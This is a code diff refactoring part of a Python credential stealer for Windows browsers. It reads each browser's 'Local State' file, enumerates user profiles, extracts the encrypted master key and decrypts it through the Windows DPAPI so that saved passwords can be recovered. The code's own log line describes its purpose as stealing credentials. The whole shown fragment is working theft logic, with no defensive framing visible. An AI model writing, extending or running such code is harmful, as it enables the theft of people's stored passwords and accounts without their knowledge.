@@ -20,18 +20,11 @@ from ctypes import (
     memmove,
     sizeof,
 )
-from ctypes.wintypes import BOOL, DWORD, HANDLE, HWND, LPBYTE, LPCWSTR, LPSTR, LPVOID, LPWSTR
+from ctypes.wintypes import BOOL, DWORD, HANDLE, HWND, LPCWSTR, LPVOID, LPWSTR
 from pathlib import PurePath
 from typing import Sequence
 
 logger = logging.getLogger(__name__)
-
-
-class CREDENTIAL_ATTRIBUTE(Structure):
-    _fields_ = [("Keyword", LPSTR), ("Flags", DWORD), ("ValueSize", DWORD), ("Value", LPBYTE)]
-
-
-PCREDENTIAL_ATTRIBUTE = POINTER(CREDENTIAL_ATTRIBUTE)
 
 
 class DATA_BLOB(Structure):
@@ -128,8 +121,8 @@ class WindowsCredentialsDatabaseSelector:
         for name, path in self.browser_paths:
             logger.info(f'Attempting to steal credentials from browser "{name}"')
 
-            profiles_path = os.path.join(path, "Local State")
-            if os.path.exists(profiles_path):
+            local_state_file_path = os.path.join(path, "Local State")
+            if os.path.exists(local_state_file_path):
                 master_key = None
 
                 # user profiles in the browser; empty string means current dir, without a profile
@@ -141,28 +134,37 @@ class WindowsCredentialsDatabaseSelector:
                     if os.path.isdir(dirs_path) and dirs.startswith("Profile"):
                         browser_profiles.add(dirs)
 
-                with open(profiles_path) as f:
+                with open(local_state_file_path) as f:
+                    try:
+                        local_state_object = json.load(f)
+                    except json.decoder.JSONDecodeError as err:
+                        logger.error(
+                            f'Couldn\'t deserialize JSON file at "{local_state_file_path}": {err}'
+                        )
+                        return []
+
                     try:
                         # add user profiles from "Local State" file
-                        data = json.load(f)
-                        browser_profiles |= set(data["profile"]["info_cache"])
-                    except json.decoder.JSONDecodeError:
-                        logger.error(f'Couldn\'t deserialize JSON file at "{profiles_path}"')
+                        browser_profiles |= set(local_state_object["profile"]["info_cache"])
                     except Exception as err:
                         logger.error(
                             "Exception encountered while trying to load user profiles "
                             f"from browser's local state: {err}"
                         )
 
-                # TODO: is there a reason the context manager is reopened here?
-                with open(profiles_path) as f:
                     try:
-                        master_key = base64.b64decode(json.load(f)["os_crypt"]["encrypted_key"])
+                        master_key = base64.b64decode(
+                            local_state_object["os_crypt"]["encrypted_key"]
+                        )
                         master_key = master_key[5:]  # removing DPAPI
                         master_key = Win32CryptUnprotectData(
                             master_key,
                         )
-                    except Exception:
+                    except Exception as err:
+                        logger.error(
+                            "Exception encountered while trying to get master key "
+                            f"from browser's local state: {err}"
+                        )
                         master_key = None
 
                 # each user profile has its own password database
